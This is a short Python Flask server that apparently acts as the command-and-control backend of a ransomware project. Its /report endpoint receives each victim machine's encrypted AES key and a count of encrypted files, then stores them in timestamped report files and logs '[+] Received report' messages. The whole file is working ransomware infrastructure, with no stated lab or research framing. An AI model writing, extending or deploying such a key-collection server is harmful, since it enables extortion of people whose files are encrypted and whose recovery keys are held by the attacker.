from flask import Flask, request, jsonify
import os
import datetime

app = Flask(__name__)

LOG_DIR = "server/reports"
os.makedirs(LOG_DIR, exist_ok=True)

@app.route("/report", methods=["POST"])
def receive_report():
    data = request.get_json()

    if not data or "aes_key" not in data or "files_encrypted" not in data:
        return jsonify({"error": "Missing data"}), 400

    aes_key = data["aes_key"]
    file_count = data["files_encrypted"]

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"{LOG_DIR}/report_{timestamp}.txt"

    with open(filename, "w") as f:
        f.write(f"Time: {timestamp}\n")
        f.write(f"Encrypted AES Key (base64):\n{aes_key}\n")
        f.write(f"Number of files encrypted: {file_count}\n")

    print(f"[+] Received report: {file_count} files encrypted. Key saved in {filename}")
    return jsonify({"status": "received"}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)